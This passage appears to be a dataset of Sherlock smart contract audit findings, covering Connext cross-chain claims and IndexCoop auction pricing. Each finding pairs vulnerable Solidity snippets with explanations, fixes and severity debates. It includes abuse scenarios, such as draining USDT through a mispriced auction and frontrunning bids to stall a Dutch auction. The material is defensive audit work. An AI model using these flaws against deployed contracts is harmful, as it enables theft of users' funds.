CrosschainDistributor: Not paying relayer fee when calling xcall to claim tokens to other domainsчmediumч```\n      id = connext.xcall(            // <------ relayer fee should be payed here\n        _recipientDomain, // destination domain\n        _recipient, // to\n        address(token), // asset\n        _recipient, // delegate, only required for self-execution + slippage\n        _amount, // amount\n        0, // slippage -- assumes no pools on connext\n        bytes('') // calldata\n      );\n```\nчCrosschainDistributor is not paying relayer fee when calling xcall to claim tokens to other domains. The transaction will not be relayed on target chain to finnalize the claim. User will not receive the claimed tokens unless they bump the transaction fee themself.\nIn `_settleClaim`, the CrosschainDistributor is using xcall to claim tokens to another domain. But relayer fee is not payed.\n```\n      id = connext.xcall(            // <------ relayer fee should be payed here\n        _recipientDomain, // destination domain\n        _recipient, // to\n        address(token), // asset\n        _recipient, // delegate, only required for self-execution + slippage\n        _amount, // amount\n        0, // slippage -- assumes no pools on connext\n        bytes('') // calldata\n      );\n```\n\nWithout the relayer fee, the transaction will not be relayed. The user will need to bump the relayer fee to finnally settle the claim by following the instructions here in the connext doc.чHelp user bump the transaction fee in Satellite.\nDiscussion\ncr-walker\nHmm, this would be a valid issue in general but Connext is paying for relayer fees in this case, i.e. a zero fee cross-chain transaction is valid in this case (and on https://docs.connext.network/developers/guides/estimating-fees). @LayneHaber any thoughts on validity?\ncr-walker\nI am marking this as valid since auditors would not know the plan to have Connext pay this fee in this case and we'll change this anyway (it seems strictly better to make the function payable and pass along message value like this:\n```\nfunction _settleClaim(\n    address _beneficiary,\n    address _recipient,\n    uint32 _recipientDomain,\n    uint256 _amount\n  ) internal virtual {\n    bytes32 id;\n    if (_recipientDomain == 0 || _recipientDomain == domain) {\n      token.safeTransfer(_recipient, _amount);\n    } else {\n      id = connext.xcall{value: msg.value}(\n        _recipientDomain, // destination domain\n        _recipient, // to\n        address(token), // asset\n        _recipient, // delegate, only required for self-execution + slippage\n        _amount, // amount\n        0, // slippage -- assumes no pools on connext\n        bytes('') // calldata\n      );\n    }\n    emit CrosschainClaim(id, _beneficiary, _recipient, _recipientDomain, _amount);\n  }\n```\n\nLayneHaber\nAgree that it is strictly better to have the fees be an option on the contract itself. We can always pass in `0` and the `xcall` will not fail, which works for our distribution but likely not for others.\nShogoki\nIs there a hint to this behaviour in the connext docs to this behaviour?\nLayneHaber\ndocs on the relayer fee behavior can be found here -- this specifically outlines bumping fees, but that implies if the fee is low enough the `xcall` goes through, it's just not processed on the destination chain.\nthere is no documentation on fee-sponsoring though, and agree that we should make this payable!\nLayneHaber\nFixed: https://github.com/SoftDAO/contracts/pull/8чUser will not receive their claimed tokens on target chain.\nCode Snippet\nTool used\nManual Review
Loss of funds during user adjustingчmediumч```\nfunction claim(\n    address beneficiary // the address that will receive tokens\n  ) external validSaleParticipant(beneficiary) nonReentrant {\n    uint256 claimableAmount = getClaimableAmount(beneficiary);\n    uint256 purchasedAmount = getPurchasedAmount(beneficiary);\n\n    // effects\n    uint256 claimedAmount = super._executeClaim(beneficiary, purchasedAmount);\n\n    // interactions\n    super._settleClaim(beneficiary, claimedAmount);\n  }\n```\nчAdjusting a user's total claimable value not working correctly\nWhenever the owner is adjusting user's total claimable value, the `records[beneficiary].total` is decreased or increased by `uint256 diff = uint256(amount > 0 ? amount : -amount);`.\nHowever some assumptions made are not correct. Scenario:\n```\nfunction claim(\n    address beneficiary // the address that will receive tokens\n  ) external validSaleParticipant(beneficiary) nonReentrant {\n    uint256 claimableAmount = getClaimableAmount(beneficiary);\n    uint256 purchasedAmount = getPurchasedAmount(beneficiary);\n\n    // effects\n    uint256 claimedAmount = super._executeClaim(beneficiary, purchasedAmount);\n\n    // interactions\n    super._settleClaim(beneficiary, claimedAmount);\n  }\n```\n\nAs we can see here the `_executeClaim` is called with the `purchasedAmount` of the user which is still 200.\n```\nfunction _executeClaim(\n    address beneficiary,\n    uint256 _totalAmount\n  ) internal virtual returns (uint256) {\n    uint120 totalAmount = uint120(_totalAmount);\n\n    // effects\n    if (records[beneficiary].total != totalAmount) {\n      // re-initialize if the total has been updated\n      _initializeDistributionRecord(beneficiary, totalAmount);\n    }\n    \n    uint120 claimableAmount = uint120(getClaimableAmount(beneficiary));\n    require(claimableAmount > 0, 'Distributor: no more tokens claimable right now');\n\n    records[beneficiary].claimed += claimableAmount;\n    claimed += claimableAmount;\n\n    return claimableAmount;\n  }\n```\n\nNow check the `if` statement:\n```\n if (records[beneficiary].total != totalAmount) {\n      // re-initialize if the total has been updated\n      _initializeDistributionRecord(beneficiary, totalAmount);\n    }\n```\n\nThe point of this is if the `total` of the user has been adjusted, to re-initialize to the corresponding amount, but since it's updated by the input value which is 200, records[beneficiary].total = 200 , the user will lose the 100 added from the owner during the `adjust`чI am not sure if it is enough to just set it the following way:\n```\n if (records[beneficiary].total != totalAmount) {\n      // re-initialize if the total has been updated\n      `--` _initializeDistributionRecord(beneficiary, totalAmount);\n     `++` _initializeDistributionRecord(beneficiary, records[beneficiary].total);\n    }\n```\n\nThink of different scenarios if it is done that way and also keep in mind that the same holds for the decrease of `records[beneficiary].total` by `adjust`\nDiscussion\nMAKEOUTHILL6\nsherlock-admin2\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nShogoki\nI do not think the adjust function is intended to be called for the PriceTierVestingSale Distributor, as it does not really make a lot of sense imho. That is why i think it is an admin error if it is called for this kind of Distributor.\ncr-walker\n@Shogoki - Alas, I think this is a valid issue because we might want to adjust distributors that refer to sales.\nReal world use cases:\nA user participated in a sale but shouldn't have: their distribution record needs to be adjusted downward\nA user participated in a sale and complains a lot about the project: adjust their distribution record upward\nhrishibhat\nResult: Medium Has duplicates Considering this a valid medium based on the issue and Sponsor comments\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nMAKEOUTHILL6: acceptedчLoss of funds for the user and the protocol\nCode Snippet\nTool used\nManual Review
Exponential and logarithmic price adapters will return incorrect pricing when moving from higher dp token to lower dp tokenчmediumч```\nfunction _calculateQuoteAssetQuantity(bool isSellAuction, uint256 _componentQuantity, uint256 _componentPrice) private pure returns (uint256) {\n    return isSellAuction ? _componentQuantity.preciseMulCeil(_componentPrice) : _componentQuantity.preciseMul(_componentPrice);\n}\n```\nчThe exponential and logarithmic price adapters do not work correctly when used with token pricing of different decimal places. This is because the resolution of the underlying expWad and lnWad functions is not fit for tokens that aren't 18 dp.\n```\nfunction _calculateQuoteAssetQuantity(bool isSellAuction, uint256 _componentQuantity, uint256 _componentPrice) private pure returns (uint256) {\n    return isSellAuction ? _componentQuantity.preciseMulCeil(_componentPrice) : _componentQuantity.preciseMul(_componentPrice);\n}\n```\n\nThe price returned by the adapter is used directly to call _calculateQuoteAssetQuantity which uses preciseMul/preciseMulCeil to convert from component amount to quote amount. Assume we wish to sell 1 WETH for 2,000 USDT. WETH is 18dp while USDT is 6dp giving us the following price:\n```\n1e18 * price / 1e18 = 2000e6\n```\n\nSolving for price gives:\n```\nprice = 2000e6\n```\n\nThis establishes that the price must be scaled to:\n```\nprice dp = 18 - component dp + quote dp\n```\n\nPlugging in our values we see that our scaling of 6 dp makes sense.\n```\n    uint256 expExpression = uint256(FixedPointMathLib.expWad(expArgument));\n\n    // Protect against priceChange overflow\n    if (scalingFactor > type(uint256).max / expExpression) {\n        return _getBoundaryPrice(isDecreasing, maxPrice, minPrice);\n    }\n    uint256 priceChange = scalingFactor * expExpression - WAD;\n\n    if (isDecreasing) {\n        // Protect against price underflow\n        if (priceChange > initialPrice) {\n            return minPrice;\n        }\n        return FixedPointMathLib.max(initialPrice - priceChange , minPrice);\n```\n\nGiven the pricing code and notably the simple scalingFactor it also means that priceChange must be in the same order of magnitude as the price which in this case is 6 dp. The issue is that on such small scales, both lnWad and expWad do not behave as expected and instead yield a linear behavior. This is problematic as the curve will produce unexpected behaviors under these circumstances selling the tokens at the wrong price. Since both functions are written in assembly it is very difficult to determine exactly what is going on or why this occurs but testing in remix gives the following values:\n```\nexpWad(1e6) - WAD = 1e6\nexpWad(5e6) - WAD = 5e6\nexpWad(10e6) - WAD = 10e6\nexpWad(1000e6) - WAD = 1000e6\n```\n\nAs seen above these value create a perfect linear scaling and don't exhibit any exponential qualities. Given the range of this linearity it means that these adapters can never work when selling from higher to lower dp tokens.ч"scalingFactor should be scaled to 18 dp then applied via preciseMul instead of simple multiplication. This allows lnWad and expWad to execute in 18 dp then be scaled down to the correct dp.\nDiscussion\npblivin0x\nAgree that scalingFactor should be 18 decimals and applied with preciseMul, will fix.\nOot2k\nNot a duplicate\nbizzyvinci\nEscalate\nThis is invalid\n`FixedPointMathLib.expWad` and `FixedPointMathLib.lnWad` uses WAD as input and WAD as output. This is mentioned in docs and you can test it out on remix. Therefore, `exp(1) = FixedPointMathLib.expWad(WAD) / WAD` and `exp(5) = FixedPointMathLib.expWad(5*WAD) / WAD`.\n`expWad(1e6) - WAD = 1e6` is equal to `exp(1e-12) - 1 = 1e-12` which is absolutely correct.\nFor the formula to work, timeCoefficient has to be in WAD. @pblivin0x should look at our DM around this time.\n\nHis comment: `scalingFactor should be 18 decimals and applied with preciseMul` is on a different matter. It's a plan for the future to allow decimal scalingFactor e.g 0.5, 2.5 rather than just integers like 1, 2, 3 etc.\nTo recap: `block.timestamp` is in seconds, therefore `timeBucket`, `_timeElapsed` and `bucketSize` are in seconds. `_componentPrice`, `initialPrice`, `minPrice`, `maxPrice`, `priceChange` and `FixedPointMathLib` are in WAD. Therefore, `expExpression`, `expArgument` and `timeCoefficient` has to also be in WAD. `scalingFactor` is just a scaler unit which the team plan to turn into WAD in the future for more precision with scaling.\nsherlock-admin2\nEscalate\nThis is invalid\n`FixedPointMathLib.expWad` and `FixedPointMathLib.lnWad` uses WAD as input and WAD as output. This is mentioned in docs and you can test it out on remix. Therefore, `exp(1) = FixedPointMathLib.expWad(WAD) / WAD` and `exp(5) = FixedPointMathLib.expWad(5*WAD) / WAD`.\n`expWad(1e6) - WAD = 1e6` is equal to `exp(1e-12) - 1 = 1e-12` which is absolutely correct.\nFor the formula to work, `timeCoefficient` has to be in WAD. @pblivin0x should look at our DM around this time.\nHis comment: `scalingFactor should be 18 decimals and applied with preciseMul` is on a different matter. It's a plan for the future to allow decimal `scalingFactor` e.g 0.5, 2.5 rather than just integers like 1, 2, 3 etc.\nTo recap: `block.timestamp` is in seconds, therefore `timeBucket`, `_timeElapsed` and `bucketSize` are in seconds. `_componentPrice`, `initialPrice`, `minPrice`, `maxPrice`, `priceChange` and `FixedPointMathLib` are in WAD. Therefore, `expExpression`, `expArgument` and `timeCoefficient` has to also be in WAD. `scalingFactor` is just a scaler unit which the team plan to turn into WAD in the future for more precision with scaling.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nIAm0x52\nSince scaling factor is not applied via precise mul in the current implementation, in order to work as the code is written it has to be have the same number of decimals as price and therefore can't be WAD, regardless of what sponsor has said in the discord comments. As I've shown in my issue these smaller values are not compatible with expWAD and lnWAD and will produce incorrect values, negatively affecting auction pricing.\nbizzyvinci\nThe getPrice function can be broken down to the following after removing `boundary price` and type conversions.\ntimeBucket = _timeElapsed / bucketSize\nexpArgument = timeCoefficient * timeBucket\nexpExpression = FixedPointMathLib.expWad(expArgument)\npriceChange = scalingFactor * expExpression - WAD\nprice = initialPrice + priceChange (or minus)\nTo know what unit should be WAD or not, we need to look elsewhere.\n`_timeElapsed` = `block.timestamp` - `rebalanceInfo[_setToken].rebalanceStartTime` here and `rebalanceInfo[_setToken].rebalanceStartTime` is set to `block.timestamp` when startRebalance is called here. Therefore `_timeElapsed`, `bucketSize` and `timeBucket` has to be seconds.\n`_componentPrice` is in precise unit or `WAD` based on calculation here. Therefore `price`, `initialPrice` and `priceChange` have to also be in `WAD`.\nFormula 4 is wrong as pointed out in #39 therefore let's just focus on the multiplication part and assume `priceChange` = `scalingFactor * expExpression`. If `priceChange` is `WAD`, then `scalingFactor * expExpression` has to be `WAD`. Either `scalingFactor` is `WAD` or `expExpression` is `WAD`.\n`FixedPointMathLib.expWad` returns `WAD`, so `expExpression` is indeed `WAD`. So `scalingFactor` is basic unit.\nFurthermore, `FixedPointMathLib.expWad` takes `WAD` as input, and that input is `timeCoefficient` * `timeBucket`. We've established that `timeBucket` is seconds in 1, so therefore `timeCoefficient` has to be `WAD`.\nThe sponsor's message was referenced because\nI was the one who decided that his initial statement `timeCoefficient and bucketSize are not in WAD` is wrong. So he might want to cross-check things again.\nWe had some discussions about scalingFactor and converting it to WAD around that time.\nIf scalingFactor is changed to WAD, then priceChange would be `WAD^2`. Therefore, we must use preciseMul to keep things balanced again. P.S: -WAD is ignored again.\n```\n+ priceChange = scalingFactorWAD.preciseMul(expExpression)\n- priceChange = scalingFactorBasic * expExpression\n```\n\nThe 2 formula are the same thing because `preciseMul(a, b) = a * b / WAD` code\n```\nfunction preciseMul(uint256 a, uint256 b) internal pure returns (uint256) {\n    return a.mul(b).div(PRECISE_UNIT);\n}\n```\n\nIAm0x52\n_componentPrice is in precise unit or WAD based on calculation here. Therefore price, initialPrice and priceChange have to also be in WAD.\nThis is incorrect. I've proven in my submission above that when going from an 18 dp token to 6 dp that price has to be 6 dp. Since scalingFactor is applied as a scaler and not via preciseMul then expArgument and expExpression have to also be in 6 dp as well. If you used a WAD expression for them the pricing would be completely wrong as it would return an 18 dp price. As I've shown expWAD returns incorrectly when inputting a 6 dp number.\nIAm0x52\nThe point of this issue is to prove that scaling factor must be applied via preciseMul or else the price cannot work as expect. To just say ""scaling factor should be applied via preciseMul"" is not a valid issue unless you can show why it's incorrect that it's not applied that way and the damages that it causes.\nbizzyvinci\nprecise unit is used for precision in calculation because the numbers could be very small and solidity does automatic rounding. When multiplying or dividing, preciseMul or preciseDiv is used to finally get rid of that precision. You can view the PreciseUnitMath library and the key take away are\n`PRECISE_UNIT = PRECISE_UNIT_INT = WAD = 1e18`\n`preciseMul(a, b) = a * b / WAD` and that only makes sense if a or b is WAD\n`preciseDiv(a, b) = a * WAD / b` and that only makes sense if b is WAD\nNow, why is `_componentPrice` in WAD? Because `_componentQuantity` and the returned `quoteAssetQuantity` are not in WAD and preciseMul needs `b` to be WAD. `_componentQuantity` and `quoteAssetQuantity` are the raw quantity amount that would be transferred with `token.transfer`.\n```\nfunction _calculateQuoteAssetQuantity(bool isSellAuction, uint256 _componentQuantity, uint256 _componentPrice) private pure returns (uint256) {\n      return isSellAuction ? _componentQuantity.preciseMulCeil(_componentPrice) : _componentQuantity.preciseMul(_componentPrice);\n  }\n```\n\npblivin0x\nI believe this is a valid medium\nOot2k\nI agree that this is valid medium\nbizzyvinci\nI still stand by my escalation and I think my proof is sufficient cause it proves the following\n_componentPrice in WAD\nRight now, scalingFactor is not WAD cause that would be mathematically wrong. It must be a normal integer.\nThe unit of each parameters (e.g which one is seconds, WAD or int) to show that price does work correctly.\nThe team plans to make scalingFactor WAD and use preciseMul. They must use preciseMul to make sure priceChange remains a WAD (rather than WAD^2)\nThe migration of scalingFactor from integer scalar to WAD scalar would not change price nor priceChange because `preciseMul(a,b) = a * b / WAD`\nThe only effect the migration has is precision. scalingFactor could then be represented as decimals instead of just integers.\nIf anyone disagrees it would be nice if they state why. Or if there's a point that wasn't clear, I'm here to clarify.\nbizzyvinci\nI understand the proof might be daunting to comprehend so I'll recommend using pen and paper (and maybe remix with calculator) to make things easier.\nbizzyvinci\nI do agree that my escalation be rejected\nhrishibhat\nResult: Medium Has duplicates Considering this a valid medium based on the above comments.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nbizzyvinci: rejected\npblivin0x\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25\nThe changes are to update to 18 decimal `scalingFactor` in both the exponential and logarithmic adapter"чExponential and logarithmic pricing is wrong when tokens have mismatched dp\nCode Snippet\nTool used\nManual Review
SetToken can't be unlocked early.чmediumч"```\n    function unlock(ISetToken _setToken) external {\n        bool isRebalanceDurationElapsed = _isRebalanceDurationElapsed(_setToken);\n        bool canUnlockEarly = _canUnlockEarly(_setToken);\n\n        // Ensure that either the rebalance duration has elapsed or the conditions for early unlock are met\n        require(isRebalanceDurationElapsed || canUnlockEarly, ""Cannot unlock early unless all targets are met and raiseTargetPercentage is zero"");\n\n        // If unlocking early, update the state\n        if (canUnlockEarly) {\n            delete rebalanceInfo[_setToken].rebalanceDuration;\n            emit LockedRebalanceEndedEarly(_setToken);\n        }\n\n        // Unlock the SetToken\n        _setToken.unlock();\n    }\n```\n"ч"SetToken can't be unlocked early\nThe function unlock() is used to unlock the setToken after rebalancing, as how it is right now there are two ways to unlock the setToken.\ncan be unlocked once the rebalance duration has elapsed\ncan be unlocked early if all targets are met, there is excess or at-target quote asset, and raiseTargetPercentage is zero\n```\n    function unlock(ISetToken _setToken) external {\n        bool isRebalanceDurationElapsed = _isRebalanceDurationElapsed(_setToken);\n        bool canUnlockEarly = _canUnlockEarly(_setToken);\n\n        // Ensure that either the rebalance duration has elapsed or the conditions for early unlock are met\n        require(isRebalanceDurationElapsed || canUnlockEarly, ""Cannot unlock early unless all targets are met and raiseTargetPercentage is zero"");\n\n        // If unlocking early, update the state\n        if (canUnlockEarly) {\n            delete rebalanceInfo[_setToken].rebalanceDuration;\n            emit LockedRebalanceEndedEarly(_setToken);\n        }\n\n        // Unlock the SetToken\n        _setToken.unlock();\n    }\n```\n\n```\n    function _canUnlockEarly(ISetToken _setToken) internal view returns (bool) {\n        RebalanceInfo storage rebalance = rebalanceInfo[_setToken];\n        return _allTargetsMet(_setToken) && _isQuoteAssetExcessOrAtTarget(_setToken) && rebalance.raiseTargetPercentage == 0;\n    }\n```\n\nThe main problem occurs as the value of raiseTargetPercentage isn't reset after rebalancing. The other thing is that the function setRaiseTargetPercentage can't be used to fix this issue as it doesn't allow giving raiseTargetPercentage a zero value.\nA setToken can use the AuctionModule to rebalance multiple times, duo to the fact that raiseTargetPercentage value isn't reset after every rebalancing. Once changed with the help of the function setRaiseTargetPercentage this value will only be non zero for every next rebalancing. A setToken can be unlocked early only if all other requirements are met and the raiseTargetPercentage equals zero.\nThis problem prevents for a setToken to be unlocked early on the next rebalances, once the value of the variable raiseTargetPercentage is set to non zero.\nOn every rebalance a manager should be able to keep the value of raiseTargetPercentage to zero (so the setToken can be unlocked early), or increase it at any time with the function setRaiseTargetPercentage.\n```\n    function setRaiseTargetPercentage(\n        ISetToken _setToken,\n        uint256 _raiseTargetPercentage\n    )\n        external\n        onlyManagerAndValidSet(_setToken)\n    {\n        // Ensure the raise target percentage is greater than 0\n        require(_raiseTargetPercentage > 0, ""Target percentage must be greater than 0"");\n\n        // Update the raise target percentage in the RebalanceInfo struct\n        rebalanceInfo[_setToken].raiseTargetPercentage = _raiseTargetPercentage;\n\n        // Emit an event to log the updated raise target percentage\n        emit RaiseTargetPercentageUpdated(_setToken, _raiseTargetPercentage);\n    }\n```\n"ч"Recommend to reset the value raiseTargetPercentage after every rebalancing.\n```\n    function unlock(ISetToken _setToken) external {\n        bool isRebalanceDurationElapsed = _isRebalanceDurationElapsed(_setToken);\n        bool canUnlockEarly = _canUnlockEarly(_setToken);\n\n        // Ensure that either the rebalance duration has elapsed or the conditions for early unlock are met\n        require(isRebalanceDurationElapsed || canUnlockEarly, ""Cannot unlock early unless all targets are met and raiseTargetPercentage is zero"");\n\n        // If unlocking early, update the state\n        if (canUnlockEarly) {\n            delete rebalanceInfo[_setToken].rebalanceDuration;\n            emit LockedRebalanceEndedEarly(_setToken);\n        }\n\n+       rebalanceInfo[_setToken].raiseTargetPercentage = 0;\n\n        // Unlock the SetToken\n        _setToken.unlock();\n    }\n```\n\nDiscussion\npblivin0x\nThe risk here is a stale `raiseTargetPercentage` can lead to a SetToken that cannot be unlocked early?\nDebating if we should include this or not.\nFlattestWhite\nShould raiseTargetPercentage be part of the check for unlocking early? I'm thinking it doesn't since that's only used when needing to `raiseTargetAssets` because we met all our targets and we have leftover WETH.\npblivin0x\nsince we can't set the raiseAssetTarget to zero, this is a valid issue. will fix\nsnake-poison\nsince we can't set the raiseAssetTarget to zero, this is a valid issue. will fix\nYea I agree with the assessment and looks like the fix is more or less clear.\npblivin0x\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25\nThe changes are to"чOnce the value of raiseTargetPercentage is set to non zero, every next rebalancing of the setToken won't be eligible for unlocking early. As the value of raiseTargetPercentage isn't reset after every rebalance and neither the manager can set it back to zero with the function setRaiseTargetPercentage().\nCode Snippet\nTool used\nManual Review
price is calculated wrongly in BoundedStepwiseExponentialPriceAdapterчmediumч```\n(\n    uint256 initialPrice,\n    uint256 scalingFactor,\n    uint256 timeCoefficient,\n    uint256 bucketSize,\n    bool isDecreasing,\n    uint256 maxPrice,\n    uint256 minPrice\n) = getDecodedData(_priceAdapterConfigData);\n\nuint256 timeBucket = _timeElapsed / bucketSize;\n\nint256 expArgument = int256(timeCoefficient * timeBucket);\n\nuint256 expExpression = uint256(FixedPointMathLib.expWad(expArgument));\n\nuint256 priceChange = scalingFactor * expExpression - WAD;\n```\nчThe BoundedStepwiseExponentialPriceAdapter contract is trying to implement price change as `scalingFactor * (e^x - 1)` but the code implements `scalingFactor * e^x - 1`. Since there are no brackets, multiplication would be executed before subtraction. And this has been confirmed with one of the team members.\nThe getPrice code has been simplified as the following when boundary/edge cases are ignored\n```\n(\n    uint256 initialPrice,\n    uint256 scalingFactor,\n    uint256 timeCoefficient,\n    uint256 bucketSize,\n    bool isDecreasing,\n    uint256 maxPrice,\n    uint256 minPrice\n) = getDecodedData(_priceAdapterConfigData);\n\nuint256 timeBucket = _timeElapsed / bucketSize;\n\nint256 expArgument = int256(timeCoefficient * timeBucket);\n\nuint256 expExpression = uint256(FixedPointMathLib.expWad(expArgument));\n\nuint256 priceChange = scalingFactor * expExpression - WAD;\n```\n\nWhen timeBucket is 0, we want priceChange to be 0, so that the returned price would be the initial price. Since `e^0 = 1`, we need to subtract 1 (in WAD) from the `expExpression`.\nHowever, with the incorrect implementation, the returned price would be different than real price by a value equal to `scalingFactor - 1`. The image below shows the difference between the right and wrong formula when initialPrice is 100 and scalingFactor is 11. The right formula starts at 100 while the wrong one starts at 110=100+11-1\nчChange the following line\n```\n- uint256 priceChange = scalingFactor * expExpression - WAD;\n+ uint256 priceChange = scalingFactor * (expExpression - WAD);\n```\n\nDiscussion\npblivin0x\nConfirmed ✅\nIAm0x52\nEscalate\nThis should be medium not high. While it is true that the calculation will be wrong for scaling factors other than 1, it heavily depends on the configuration of auction settings as to whether this sells assets at a bad price and causes a loss to the set token.\nsherlock-admin2\nEscalate\nThis should be medium not high. While it is true that the calculation will be wrong for scaling factors other than 1, it heavily depends on the configuration of auction settings as to whether this sells assets at a bad price and causes a loss to the set token.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\npblivin0x\nEscalate\nThis should be medium not high. While it is true that the calculation will be wrong for scaling factors other than 1, it heavily depends on the configuration of auction settings as to whether this sells assets at a bad price and causes a loss to the set token.\nAgree here this should be a medium not a high\nmanager's are expected to preview full auction price curves ahead of a `startRebalance` call by calling the pure function `getPrice` with input `_timeElapsed` in the range `[0, _duration]`\nthe difference is not catastrophic, it is a shift that stays constant throughout the auction https://colab.research.google.com/drive/1ZkXs2MuTJFaWUU611KolNXQ52zh9k3VM?usp=sharing\n\nbizzyvinci\nmanager's are expected to preview full auction price curves ahead of a startRebalance call by calling the pure function getPrice with input _timeElapsed in the range [0, _duration]\ngetPrice only takes in one `_timeElapsed` (not array), so managers can't view full curve. Also, the curve is directly affected by `timeBucket`, rather than `_timeElapsed`. Different `_timeElapsed` could give the same price depending on bucketSize. There's hardly a simulation or plotting tool for solidity, so it might be done in other languages like we're doing right now.\nthe difference is not catastrophic\nIt could be very catastrophic mainly because it affects priceChange (which would then be added or subtracted from price). WE DON'T KNOW WHAT INITIAL PRICE IS. It could be `10,000`, it could `20`, it could be `0.1`, it could be `1e-12`.\nPOC\nA manager wants to switch stablecoins. He wants to buy DAI and Sell USDT at a price of minimum and initial price of `1` and increasing to `1.05`.\nTechnically, the price is not `1`, but rather `1e-12` because of decimals `1e6/1e18` (1e6 in WAD)\nWith the right formula\nIf he uses the scalingFactor of `2`, the priceChange at `t0` would be 0\nTherefore bidder would have to pay 1e18 DAI for 1e6USDT.\nWith the wrong formula\nIf he uses the scalingFactor of `2`, the priceChange at `t0` would `1` (1e18 in WAD) instead of `0`\nTherefore the price would increase by a magnitude 1e12.\nTherefore, bidder would pay approximately 1e18 DAI for 1e6 * 1e12 USDT.\nAttacker could take 1e12 (1 trillion USDT) with one DAI in a flash.\nOr if there's not enough liquidity e.g if there's only 1m USDT, then he'll pay `1e-12` DAI. That's less than a penny.\nbizzyvinci\nMy bad, I agree with Med cause the catastrophe is bounded by min and max value.\npblivin0x\nMy bad, I agree with Med cause the catastrophe is bounded by min and max value.\nI think we all agree this should be de-escalated to a Medium\nhrishibhat\nResult: Medium Has duplicates Considering this a valid medium based on the above comments.\nsherlock-admin2\nEscalations have been resolved successfully!\nEscalation status:\nIAm0x52: accepted\npblivin0x\nThe remediation for this issue is open for review here https://github.com/IndexCoop/index-protocol/pull/25чIncorrect price is returned from BoundedStepwiseExponentialPriceAdapter and that will have devastating effects on rebalance.\nCode Snippet\nTool used\nManual Review
Full inventory asset purchases can be DOS'd via frontrunningчmediumч"```\n    // Ensure that the component quantity in the bid does not exceed the available auction quantity.\n    require(_componentQuantity <= bidInfo.auctionQuantity, ""Bid size exceeds auction quantity"");\n```\n"ч"Users who attempt to swap the entire component value can be frontrun with a very small bid making their transaction revert\n```\n    // Ensure that the component quantity in the bid does not exceed the available auction quantity.\n    require(_componentQuantity <= bidInfo.auctionQuantity, ""Bid size exceeds auction quantity"");\n```\n\nWhen creating a bid, it enforces the above requirement. This prevents users from buying more than they should but it is also a source of an easy DOS attack. Assume a user is trying to buy the entire balance of a component, a malicious user can frontrun them buying only a tiny amount. Since they requested the entire balance, the call with fail. This is a useful technique if an attacker wants to DOS other buyers to pass the time and get a better price from the dutch auction."ч"Allow users to specify type(uint256.max) to swap the entire available balance\nDiscussion\npblivin0x\nThe recommendation here is that we allow `componentQuantity` to be specified in excess of the auction size? so replace the current check\n```\n// Ensure that the component quantity in the bid does not exceed the available auction quantity.\nrequire(_componentQuantity <= bidInfo.auctionQuantity, ""Bid size exceeds auction quantity"");\n```\n\nwith a enforced cap\n```\nif (_componentQuantity > bidInfo.auctionQuantity) {\n    _componentQuantity = bidInfo.auctionQuantity;\n}\n```\n\nI was originally hesitant because of some unintuitive UX, but if this removes the potential for a DOS attack, i think it is worth implementing.\nFlattestWhite\nHmmm we should probably allow user to specify `maxQuantity` rather than the absolute quantity they want to buy\nsnake-poison\nThe recommendation here is that we allow `componentQuantity` to be specified in excess of the auction size? so replace the current check\n`// Ensure that the component quantity in the bid does not exceed the available auction quantity.\nrequire(_componentQuantity <= bidInfo.auctionQuantity, ""Bid size exceeds auction quantity"");`\nwith a enforced cap\n`if (_componentQuantity > bidInfo.auctionQuantity) {\n    _componentQuantity = bidInfo.auctionQuantity;\n}`\nI was originally hesitant because of some unintuitive UX, but if this removes the potential for a DOS attack, i think it is worth implementing.\nI believe what the submitter was recommending was something more akin to keeping the :\n```\n if (_componentQuantity == type(uint256).max) {\n     _componentQuantity = bidInfo.auctionQuantity;\n} else {\nrequire(_componentQuantity <= bidInfo.auctionQuantity, ""Bid size exceeds auction quantity"");\n}\n```\n\nnote: the difference in gas is trivial, but it isn't equivalent to your suggestion so I wanted to point it out. My examples assumes pragma > 0.7 to use the type().max syntax but the older idiomatic `uint256(-1)` would.\nsherlock-admin2\nEscalate\nSeverity should not be Medium, has to be low or invalid, because there is no incentive at all for front-runners and also based on Sherlock's documentation, DOS < 1yr is not a valid one.\nThe escalation could not be created because you are not exceeding the escalation threshold.\nYou can view the required number of additional valid issues/judging contest payouts in your Profile page, in the Sherlock webapp.\nJJtheAndroid\nEscalate\nThis issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\nsherlock-admin2\nEscalate\nThis issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\nYou've created a valid escalation!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nArabadzhiew\nEscalate\nThis issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\nCan't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block.\nJJtheAndroid\nEscalate This issue should be low/invalid as per Sherlock's rules https://docs.sherlock.xyz/audits/judging/judging. In addition, this is an edge case with no user funds at risk.\nCan't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen unintentionally, when a lot of bid transactions get executed in the same block.\nIn your scenario, users can only prolong it as long the current price is higher than min price. Malicious front running is useless beyond that point, because the price cannot go any lower. This would be invalid as per Sherlock rules on DOS attacks.\nThe unintentional scenario is not a DOS, it is just multiple people bidding at the same time. This is by design.\nAgain, no user funds are at risk. This should not be a med\nIAm0x52\nCan't agree on this. This is definitely not an edge case. There is an incentive to perform such kind of a DoS - If the price of the auction decreases over time, users will probably want to prolong it as much as they can. Additionally, the DoS can very easily happen 